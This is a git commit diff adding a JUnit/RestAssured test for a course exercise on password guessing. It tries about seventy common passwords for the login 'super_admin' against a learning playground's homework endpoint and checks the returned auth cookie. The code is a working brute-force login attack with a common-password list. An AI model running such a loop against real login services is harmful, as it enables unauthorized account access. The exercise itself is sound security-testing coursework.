b7e24c79b4c8c9fb154eb6663eac1c8e3f78a892
arishkinnov777 <arina-novikova2009@yandex.ru>
2024-01-06 22:23:08 +0300

    Ex9: Подбор пароля

--- src/test/java/ru/arina/novikova/learn/HelloWorldTest.java
+++ src/test/java/ru/arina/novikova/learn/HelloWorldTest.java
@@ -1,14 +1,19 @@
 package ru.arina.novikova.learn;
 
 import io.restassured.RestAssured;
+import io.restassured.http.Cookie;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
 
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.HashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Map;
 
 public class HelloWorldTest {
 
@@ -118,6 +123,109 @@ public class HelloWorldTest {
         Assertions.assertNotNull(result);
 
         System.out.println("token: " + token + ", seconds: " + seconds + ", Status: " + status + ", Result: " + result);
+    }
+
+    @Test
+    @DisplayName("Ex9: Подбор пароля")
+    public void testPasswordBruteForce() {
+        Map<String, String> params = new HashMap<>();
+        HashSet<String> passwords = new HashSet<>(Arrays.asList(
+                "111111",
+                "qazwsx",
+                "password",
+                "loveme",
+                "123456",
+                "welcome",
+                "access",
+                "1234",
+                "password1",
+                "flower",
+                "iloveyou",
+                "1234567",
+                "1q2w3e4r",
+                "123456789",
+                "aa123456",
+                "qwerty",
+                "passw0rd",
+                "555555",
+                "000000",
+                "whatever",
+                "123123",
+                "ninja",
+                "admin",
+                "adobe123",
+                "qaz2wsx",
+                "lovely",
+                "hottie",
+                "solo",
+                "football",
+                "Football",
+                "michael",
+                "12345",
+                "shadow",
+                "sunshine",
+                "mustang",
+                "dragon",
+                "1234567890",
+                "bailey",
+                "654321",
+                "princess",
+                "jesus",
+                "baseball",
+                "hello",
+                "zaq1zaq1",
+                "letmein",
+                "login",
+                "freedom",
+                "!@#$%^&*",
+                "696969",
+                "666666",
+                "charlie",
+                "donald",
+                "monkey",
+                "abc123",
+                "12345678",
+                "starwars",
+                "photoshop",
+                "superman",
+                "888888",
+                "qwerty123",
+                "azerty",
+                "121212",
+                "ashley",
+                "qwertyuiop",
+                "7777777",
+                "batman",
+                "master",
+                "trustno1",
+                "123qwe"
+        ));
+
+        params.put("login", "super_admin");
+        for (String password : passwords) {
+            params.put("password", password);
+            Response response = RestAssured
+                    .given()
+                    .body(params)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            Cookie authCookie = response.getDetailedCookie("auth_cookie");
+            response = RestAssured
+                    .given()
+                    .cookie(authCookie)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+            String result = response.getBody().htmlPath().getString("body");
+            if (result.equals("You are authorized")) {
+                System.out.println("Password: " + password);
+                System.out.println(result);
+                break;
+            }
+        }
     }
 
 }
